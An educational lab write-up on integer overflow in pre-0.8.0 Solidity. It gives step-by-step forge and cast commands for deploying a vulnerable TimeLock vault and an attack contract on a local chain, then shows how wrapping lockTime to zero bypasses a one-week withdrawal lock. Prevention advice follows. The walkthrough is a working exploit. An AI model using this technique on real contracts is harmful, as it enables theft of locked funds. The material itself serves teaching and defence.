## Arithmetic Overflow and Underflow

**Reference:** https://solidity-by-example.org/hacks/overflow/

This demonstrates **integer overflow/underflow vulnerabilities** in Solidity versions prior to 0.8.0. This attack exploits unchecked arithmetic to bypass a time-lock mechanism and withdraw funds immediately.

### 🎯 The Vulnerability

**What is Integer Overflow/Underflow?**

In programming, integers have a maximum and minimum value they can hold:
- **uint256 max:** `2^256 - 1` (115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,935)
- **uint256 min:** `0`

**Overflow:** Adding to the maximum value wraps back to 0
```
type(uint256).max + 1 = 0
```

**Underflow:** Subtracting from 0 wraps to the maximum value
```
0 - 1 = type(uint256).max
```

**The Danger:**
- In Solidity < 0.8.0, arithmetic operations silently wrap around
- No errors, no warnings - just incorrect results!
- This can bypass security checks like time locks

---

### 🚀 Setup

**Start Anvil (local blockchain)**

```bash
anvil
```

---

### 🔒 Step 1: Deploy TimeLock Contract

TimeLock is a simple vault that forces users to wait 1 week before withdrawing their ETH.

**Deployer's Details:**
- Address: `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`
- Private Key: `0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80`

```bash
forge create src/arithmeticOverflowAndUnderflow/ArithmeticOverflowAndUnderflow.sol:TimeLock \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast

  # Contract deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

---

### 😈 Step 2: Deploy Attack Contract

```bash
forge create src/arithmeticOverflowAndUnderflow/ArithmeticOverflowAndUnderflow.sol:Attack \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast \
  --constructor-args 0x5FbDB2315678afecb367f032d93F642f64180aa3

  # Contract deployed to: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
```

---

### ⚔️ Step 3: Execute Overflow Attack

**Verify Attack contract balance (before):**

```bash
cast balance 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 -e
# 0.000000000000000000 ETH
```

**Launch the attack with 1 ETH:**

The attack will deposit 1 ETH but **immediately withdraw it** by exploiting the overflow!

```bash
cast send 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 \
  "attack()" \
  --value 1ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

**Verify Attack contract balance (after):**

```bash
cast balance 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512 -e
# 1.000000000000000000 ETH 🎯
```

**Attack successful!** The 1-week time lock was completely bypassed! The attacker deposited and immediately withdrew the funds without waiting.

---

### 🔍 How the Attack Works

#### The Vulnerable Code

```solidity
function increaseLockTime(uint256 _secondsToIncrease) public {
    lockTime[msg.sender] += _secondsToIncrease;  // ⚠️ UNCHECKED ADDITION!
}
```

In Solidity 0.7.6, this addition can **overflow** without any error.

#### The Attack Flow

**Step 1: Deposit 1 ETH**

```solidity
timeLock.deposit{value: msg.value}();
```

After deposit:
- `balances[Attack] = 1 ETH`
- `lockTime[Attack] = block.timestamp + 1 weeks`
- Example: `lockTime = 1,000,000 + 604,800 = 1,604,800`

**Step 2: Calculate Overflow Value**

The attacker needs to find a value `x` such that:
```
lockTime + x = 2^256
```

Since `2^256 = 0` (due to overflow), this simplifies to:
```
lockTime + x = 0
x = -lockTime
x = 2^256 - lockTime
x = (type(uint256).max + 1) - lockTime
```

**In the code:**
```solidity
timeLock.increaseLockTime(
    type(uint256).max + 1 - timeLock.lockTime(address(this))
);
```

**Step 3: Overflow Happens!**

```solidity
lockTime[msg.sender] += _secondsToIncrease;
```

Let's say `lockTime = 1,604,800`:
```
new lockTime = 1,604,800 + (2^256 - 1,604,800)
             = 2^256
             = 0  ← OVERFLOW!
```

**Step 4: Immediate Withdrawal**

```solidity
timeLock.withdraw();
```

The withdraw function checks:
```solidity
require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
```

Since `lockTime = 0` and `block.timestamp > 0`, the check passes! ✅

**Result:** Instant withdrawal, bypassing the 1-week lock completely!

#### Visual Representation

```
Normal Flow:
├─ Deposit ETH → lockTime = now + 1 week
├─ Wait 1 week... ⏳
└─ Withdraw ✅

Attack Flow:
├─ Deposit ETH → lockTime = now + 1 week  (e.g., 1,604,800)
├─ increaseLockTime(2^256 - 1,604,800)
│   └─ lockTime = 1,604,800 + (2^256 - 1,604,800) = 2^256 = 0  ← OVERFLOW!
└─ Withdraw immediately (now > 0) ✅ 💸
```

---

### 🛡️ Prevention

#### Solution 1: Use Solidity 0.8.0+ (Recommended)

**Solidity 0.8.0+ has built-in overflow/underflow protection:**

```solidity
pragma solidity ^0.8.0;  // ✅ Safe by default!

function increaseLockTime(uint256 _secondsToIncrease) public {
    lockTime[msg.sender] += _secondsToIncrease;  // ✅ Will revert on overflow
}
```

In Solidity 0.8.0+, arithmetic operations automatically revert on overflow/underflow!

#### Solution 2: Use SafeMath Library (For Solidity < 0.8.0)

If you must use older Solidity versions:

```solidity
pragma solidity ^0.7.6;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract TimeLock {
    using SafeMath for uint256;
    
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);  // ✅ Safe
        lockTime[msg.sender] = block.timestamp.add(1 weeks);  // ✅ Safe
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);  // ✅ Safe
        // Will revert with "SafeMath: addition overflow" if overflow occurs
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

#### Solution 3: Manual Overflow Checks

```solidity
function increaseLockTime(uint256 _secondsToIncrease) public {
    uint256 newLockTime = lockTime[msg.sender] + _secondsToIncrease;
    require(newLockTime >= lockTime[msg.sender], "Overflow detected");  // ✅ Check
    lockTime[msg.sender] = newLockTime;
}
```

---

### 📋 Best Practices

1. **Always use Solidity 0.8.0 or higher** for new contracts
   - Built-in overflow/underflow protection
   - No need for SafeMath

2. **For legacy contracts (< 0.8.0):**
   - Use OpenZeppelin's SafeMath library
   - Manually check for overflow/underflow

3. **Use `unchecked` sparingly in 0.8.0+:**
   ```solidity
   unchecked {
       counter++;  // Skips overflow check (use only when safe!)
   }
   ```

4. **Test edge cases:**
   - Maximum values (`type(uint256).max`)
   - Minimum values (0)
   - Boundary conditions

---

### 🎯 Key Takeaways

- ✅ **Solidity < 0.8.0:** Arithmetic operations can silently overflow/underflow
- ✅ **Solidity >= 0.8.0:** Automatic overflow/underflow protection (reverts on error)
- ✅ **Legacy code:** Use SafeMath library for all arithmetic operations
- ✅ **Security impact:** Overflow bugs can completely break contract logic
- ✅ **Historical note:** Many early Ethereum contracts were vulnerable to this

**Remember:** Always upgrade to Solidity 0.8.0+ for new projects. The built-in protections prevent an entire class of vulnerabilities!

---


